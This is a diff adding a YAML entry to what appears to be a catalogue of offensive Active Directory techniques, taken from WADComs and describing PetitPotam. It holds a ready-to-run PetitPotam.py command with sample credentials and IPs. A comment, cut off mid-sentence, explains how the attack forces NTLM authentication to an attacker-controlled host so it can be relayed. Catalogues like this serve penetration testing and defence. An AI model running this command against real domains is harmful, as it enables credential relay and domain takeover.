@@ -1,0 +1,31 @@
+id: wadcoms/petitpotam
+type: technique
+platform: active-directory
+name: PetitPotam
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- a valid password
+- a valid username
+commands:
+- template: python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1
+  comment: PetitPotam leverages the MS-EFSRPC API to connect to a Windows host, hijack the authentication
+    session, and trigger an authentication from the target host to an attacker controlled host (usually
+    SMB or HTTP server). This captured authentication can then be relayed to authenticate
+references:
+- https://github.com/topotam/PetitPotam
+- https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory
+tags:
+- active-directory
+- wadcoms
+- rpc
+- ntlm
